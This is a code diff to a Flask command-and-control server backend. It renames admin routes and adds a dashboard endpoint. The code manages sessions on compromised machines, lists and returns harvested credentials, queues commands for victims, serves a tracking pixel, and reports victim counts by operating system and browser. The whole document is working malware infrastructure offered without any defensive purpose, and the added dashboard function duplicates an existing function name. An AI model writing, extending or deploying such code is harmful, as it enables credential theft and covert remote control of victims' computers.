@@ -208,7 +208,7 @@ def submit_results():
 
 
 # Admin routes for C2 management
-@c2_bp.route('/cracked/c2/sessions', methods=['GET'])
+@c2_bp.route('/c2/sessions', methods=['GET'])
 def list_sessions():
     """List all active C2 sessions for admin panel"""
     # Secure this with your existing admin authentication
@@ -263,7 +263,7 @@ def list_sessions():
         current_app.logger.error(f"Error listing sessions: {str(e)}")
         return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
 
-@c2_bp.route('/cracked/c2/sessions/<session_id>', methods=['GET'])
+@c2_bp.route('/c2/sessions/<session_id>', methods=['GET'])
 def get_session_details(session_id):
     """Get detailed information about a specific session"""
     if not session.get('cracked_admin_logged_in'):
@@ -330,7 +330,7 @@ def get_session_details(session_id):
         current_app.logger.error(f"Error getting session details: {str(e)}")
         return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
 
-@c2_bp.route('/cracked/c2/sessions/<session_id>/credentials', methods=['GET'])
+@c2_bp.route('/c2/sessions/<session_id>/credentials', methods=['GET'])
 def get_session_credentials(session_id):
     """Get all credentials for a specific session"""
     if not session.get('cracked_admin_logged_in'):
@@ -361,7 +361,7 @@ def get_session_credentials(session_id):
         current_app.logger.error(f"Error getting session credentials: {str(e)}")
         return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
 
-@c2_bp.route('/cracked/c2/sessions/<session_id>/command', methods=['POST'])
+@c2_bp.route('/c2/sessions/<session_id>/command', methods=['POST'])
 def queue_command(session_id):
     """Queue a new command for a specific session"""
     if not session.get('cracked_admin_logged_in'):
@@ -413,7 +413,7 @@ def queue_command(session_id):
         current_app.logger.error(f"Error queuing command: {str(e)}")
         return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
 
-@c2_bp.route('/cracked/c2/commands/<command_id>/results', methods=['GET'])
+@c2_bp.route('/c2/commands/<command_id>/results', methods=['GET'])
 def get_command_results(command_id):
     """Get results for a specific command"""
     if not session.get('cracked_admin_logged_in'):
@@ -479,7 +479,7 @@ def tracking_pixel():
         return gif_data, 200, {'Content-Type': 'image/gif'}
 
 # Admin dashboard route
-@c2_bp.route('/cracked/c2/dashboard', methods=['GET'])
+@c2_bp.route('/c2/dashboard', methods=['GET'])
 def c2_dashboard():
     """Get summary statistics for the C2 dashboard"""
     if not session.get('cracked_admin_logged_in'):
@@ -565,7 +565,7 @@ def c2_dashboard():
         return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
 
 
-@c2_bp.route('/cracked/c2/credentials', methods=['GET'])
+@c2_bp.route('/c2/credentials', methods=['GET'])
 def get_all_credentials():
     """Get all harvested credentials"""
     if not session.get('cracked_admin_logged_in'):
@@ -588,7 +588,131 @@ def get_all_credentials():
         current_app.logger.error(f"Error getting all credentials: {str(e)}")
         return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
 
-
+@c2_bp.route('/dashboard', methods=['GET'])
+def c2_dashboard():
+    """Get summary statistics for the C2 dashboard"""
+    from flask import session, jsonify, current_app
+    from datetime import datetime, timedelta
+    
+    if not session.get('cracked_admin_logged_in'):
+        return jsonify({"error": "Admin authentication required"}), 401
+    
+    try:
+        # Count active sessions (active in last 5 minutes)
+        active_count = 0
+        five_min_ago = datetime.utcnow() - timedelta(minutes=5)
+        
+        for session_data in active_sessions.values():
+            if session_data.get("last_seen") and session_data["last_seen"] > five_min_ago:
+                active_count += 1
+        
+        # Count total sessions
+        total_sessions = len(active_sessions)
+        
+        # Count total credentials
+        total_credentials = db.harvested_credentials.count_documents({})
+        
+        # Count commands
+        total_commands = db.c2_command_history.count_documents({})
+        completed_commands = db.c2_command_history.count_documents({"status": "completed"})
+        
+        # Get recent activity (last 10 events)
+        recent_activity = []
+        
+        # Get recent commands
+        recent_commands = list(db.c2_command_history.find(
+            {},
+            sort=[("created_at", -1)],
+            limit=5
+        ))
+        
+        for cmd in recent_commands:
+            # Convert ObjectId to string
+            if '_id' in cmd:
+                cmd['_id'] = str(cmd['_id'])
+                
+            recent_activity.append({
+                "type": "command",
+                "session_id": cmd["session_id"],
+                "command_type": cmd["command_type"],
+                "status": cmd["status"],
+                "timestamp": cmd["created_at"]
+            })
+        
+        # Get recent credentials
+        recent_creds = list(db.harvested_credentials.find(
+            {},
+            sort=[("timestamp", -1)],
+            limit=5
+        ))
+        
+        for cred in recent_creds:
+            # Convert ObjectId to string
+            if '_id' in cred:
+                cred['_id'] = str(cred['_id'])
+                
+            recent_activity.append({
+                "type": "credential",
+                "session_id": cred["session_id"],
+                "source": cred.get("source", "unknown"),
+                "timestamp": cred["timestamp"]
+            })
+        
+        # Sort by timestamp
+        recent_activity.sort(key=lambda x: x["timestamp"], reverse=True)
+        
+        # Limit to 10
+        recent_activity = recent_activity[:10]
+        
+        # Convert timestamps to strings for serialization
+        for activity in recent_activity:
+            if isinstance(activity["timestamp"], datetime):
+                activity["timestamp"] = activity["timestamp"].isoformat()
+        
+        # Get system statistics
+        system_counts = {
+            "windows": db.c2_systems.count_documents({"system_info.osName": "Windows"}),
+            "macos": db.c2_systems.count_documents({"system_info.osName": "MacOS"}),
+            "linux": db.c2_systems.count_documents({"system_info.osName": "Linux"}),
+            "other": db.c2_systems.count_documents({
+                "system_info.osName": {"$nin": ["Windows", "MacOS", "Linux"]}
+            })
+        }
+        
+        # Get browser statistics
+        browser_counts = {
+            "chrome": db.c2_systems.count_documents({"system_info.browserName": "Chrome"}),
+            "firefox": db.c2_systems.count_documents({"system_info.browserName": "Firefox"}),
+            "safari": db.c2_systems.count_documents({"system_info.browserName": "Safari"}),
+            "edge": db.c2_systems.count_documents({"system_info.browserName": "Edge"}),
+            "other": db.c2_systems.count_documents({
+                "system_info.browserName": {"$nin": ["Chrome", "Firefox", "Safari", "Edge"]}
+            })
+        }
+        
+        return jsonify({
+            "status": "success",
+            "statistics": {
+                "active_sessions": active_count,
+                "total_sessions": total_sessions,
+                "total_credentials": total_credentials,
+                "total_commands": total_commands,
+                "completed_commands": completed_commands,
+                "system_stats": system_counts,
+                "browser_stats": browser_counts
+            },
+            "recent_activity": recent_activity
+        }), 200
+    
+    except Exception as e:
+        current_app.logger.error(f"Error getting C2 dashboard data: {str(e)}")
+        # Return an error response but still with valid JSON structure
+        return jsonify({
+            "status": "error", 
+            "message": f"Internal server error: {str(e)}"
+        }), 500        
+        
+        
 def notify_admin_new_session(session_id, session_data):
     """Notify admin of new session"""
     socketio.emit('c2_new_session', {
